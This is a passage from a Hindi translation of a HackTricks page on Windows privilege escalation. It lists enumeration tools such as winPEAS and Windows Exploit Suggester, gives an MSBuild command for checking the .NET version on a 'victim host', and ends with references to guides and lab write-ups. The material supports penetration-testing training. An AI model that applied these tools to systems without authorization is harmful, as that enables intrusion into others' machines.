[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित मिसकन्फ़िगरेशन की जाँच (python से exe)। अनुशंसित नहीं। यह Win10 पर अच्छा काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट के आधार पर बनाया गया टूल (इसे ठीक से काम करने के लिए accesschk की आवश्यकता नहीं है पर यह इसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits की सिफारिश करता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits की सिफारिश करता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Project को सही .NET version के साथ compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). पीड़ित host पर installed .NET version देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
